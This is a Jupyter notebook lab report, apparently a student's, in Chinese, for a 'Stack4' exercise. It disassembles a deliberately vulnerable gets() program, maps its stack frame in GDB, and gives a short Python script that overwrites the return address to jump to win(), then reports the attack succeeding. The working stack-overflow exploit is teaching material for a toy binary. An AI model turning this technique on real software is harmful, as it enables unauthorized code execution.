{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## CS3312 Lab Report Stack4\n",
    "\n",
    "Osamu Takenaka 520030990026"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 源码分析\n",
    "\n",
    "x86汇编代码(由objdump得到)：\n",
    "\n",
    "```asm\n",
    "080483f4 <win>:\n",
    " 80483f4:\t55                   \tpush   %ebp\n",
    " 80483f5:\t89 e5                \tmov    %esp,%ebp\n",
    " 80483f7:\t83 ec 18             \tsub    $0x18,%esp\n",
    " 80483fa:\tc7 04 24 e0 84 04 08 \tmovl   $0x80484e0,(%esp)\n",
    " 8048401:\te8 26 ff ff ff       \tcall   804832c <puts@plt>\n",
    " 8048406:\tc9                   \tleave  \n",
    " 8048407:\tc3                   \tret    \n",
    "\n",
    "08048408 <main>:\n",
    " 8048408:\t55                   \tpush   %ebp\n",
    " 8048409:\t89 e5                \tmov    %esp,%ebp\n",
    " 804840b:\t83 e4 f0             \tand    $0xfffffff0,%esp\n",
    " 804840e:\t83 ec 50             \tsub    $0x50,%esp\n",
    " 8048411:\t8d 44 24 10          \tlea    0x10(%esp),%eax\n",
    " 8048415:\t89 04 24             \tmov    %eax,(%esp)\n",
    " 8048418:\te8 ef fe ff ff       \tcall   804830c <gets@plt>\n",
    " 804841d:\tc9                   \tleave  \n",
    " 804841e:\tc3                   \tret    \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "C语言源代码：\n",
    "```c\n",
    "#include <stdlib.h>\n",
    "#include <unistd.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "\n",
    "void win()\n",
    "{\n",
    "    printf(\"code flow successfully changed\\n\");\n",
    "}\n",
    "\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "    char buffer[64];\n",
    "\n",
    "    gets(buffer);\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "这段C程序同样是一个典型的缓冲区溢出漏洞：\n",
    "\n",
    "我们需要让溢出部分改变函数执行后的返回地址，使得程序跳转到win函数。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "##### 变量以及函数位置确定"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "`buffer`:\n",
    "\n",
    "通过这句C代码：\n",
    "```c\n",
    "    gets(buffer);\n",
    "```\n",
    "可以定位到汇编中对应的代码为：\n",
    "\n",
    "```asm\n",
    " 8048411:\t8d 44 24 10          \tlea    0x10(%esp),%eax\n",
    " 8048415:\t89 04 24             \tmov    %eax,(%esp)\n",
    " 8048418:\te8 ef fe ff ff       \tcall   804830c <gets@plt>\n",
    "```\n",
    "\n",
    "可以看出，`buffer`数组的开始地址是0x10(%esp)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "`win()`:\n",
    "\n",
    "通过以下关于win函数的汇编代码可以找到`win`函数的地址：\n",
    "\n",
    "```asm\n",
    "080483f4 <win>:\n",
    "```\n",
    "\n",
    "`win`函数的地址是0x80483f4"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "#### GDB调试\n",
    "\n",
    "- 接下来我们需要通过gdb，通过查看`%esp`和`%ebp`的值，得到准确的main函数的函数帧内存范围。\n",
    "\n",
    "    添加断点在main，\n",
    "\n",
    "    <img src=\"https://cdn.mathpix.com/snip/images/r6o27WkvBkdnW22udYEQyYx81XZlAkJYYVlh4_l0Jto.original.fullsize.png\" width=\"30%\" />\n",
    "\n",
    "    `%esp`的值是`0xffe294b0`，`%ebp`的值是`0xffe29508`\n",
    "\n",
    "    `buffer`的起始地址是`0xffe294b0 + 0x10 = 0xffe294c0`\n",
    "    \n",
    "    通过如下main的汇编代码：\n",
    "    ```asm\n",
    "    08048408 <main>:\n",
    "    8048408:\t55                   \tpush   %ebp\n",
    "    8048409:\t89 e5                \tmov    %esp,%ebp\n",
    "    804840b:\t83 e4 f0             \tand    $0xfffffff0,%esp\n",
    "    804840e:\t83 ec 50             \tsub    $0x50,%esp\n",
    "    ```\n",
    "    我们可以计算得到main的函数栈帧的如下示意图（从上至下，地址由大到小，所以这个栈是反着的）：\n",
    "    \n",
    "    <!-- | 地址 | 该地址的内容（大小4Bytes） | 备注 |\n",
    "    | :--- | :--- | :--- |\n",
    "    | 0xffe29510 |  | main的上一级函数的栈顶 |\n",
    "    | 0xffe2950c | 执行完main函数后的返回地址 | 就是我们需要修改的值，需要令其为win函数的地址 |\n",
    "    | 0xffe29508 | main的上一级函数的ebp | <- %ebp |\n",
    "    | 0xffe29504 | 无意义 |  |\n",
    "    | 0xffe29500 | 无意义 | <- %ebp对齐后指向的地址 |\n",
    "    | 0xffe294fc | buffer[60-63] |  |\n",
    "    | $\\ldots$ |  |  |\n",
    "    | 0xffe294c4 | buffer[4-7] |  |\n",
    "    | 0xffe294c0 | buffer[0-3] | <- buffer的起始地址  |\n",
    "    | $\\ldots$ |  |  |\n",
    "    | 0xffe294b0 | 下一级调用的函数gets()传递的参数 | <- %esp  | -->\n",
    "\n",
    "    <img src=\"https://cdn.mathpix.com/snip/images/n--tfPbQ55_ZREBSoXB6flHwOd7HNnEsXXxuDp2zbIY.original.fullsize.png\" width=\"50%\" />"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- 然后，运行`gets()`时，为了在打印内存时更容易找到`buffer`的区域，我们输入64个'a'，运行完`gets()`后，我们打印一下相关内存区域：\n",
    "\n",
    "    <img src=\"https://cdn.mathpix.com/snip/images/m14CfGbQB4J8R4ss3-fnEsSqT6fxtswcMxLZHl8DO4A.original.fullsize.png\" width=\"50%\" />\n",
    "\n",
    "    可以看到大片的`0x61`，即`a`，即为buffer的地址区域，为`0xffe294c0`至`0xffe294ff`，我们的计算是正确的。\n",
    "\n",
    "    \n",
    "- 接下来我们需要构造输入，使得`0xffe2950c`的值变为`0x80483f4`(win函数的地址)。\n",
    "\n",
    "    该系统为小端，所以`0xffe2950c`至`0xffe2950f`在内存中应该是`0xf4 0x83 0x04 0x08`（地址从左至右依次增大）。\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 攻击脚本内容\n",
    "\n",
    "script_stack4.py:\n",
    "\n",
    "```python\n",
    "import sys\n",
    "buffer = b'a' * 76\n",
    "modified = b'\\xf4\\x83\\x04\\x08'\n",
    "ans = buffer + modified\n",
    "sys.stdout.buffer.write(ans)\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "    \n",
    "在终端中运行：\n",
    "\n",
    "```bash\n",
    "python3 script_stack4.py | ./stack4\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 结果（非GDB环境）\n",
    "\n",
    "<img src=\"https://cdn.mathpix.com/snip/images/bL-z4-8__Kim6GStnksra_WAS76jg4Cd2PZkq7MEagI.original.fullsize.png\" width=\"50%\" />\n",
    "\n",
    "攻击成功"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
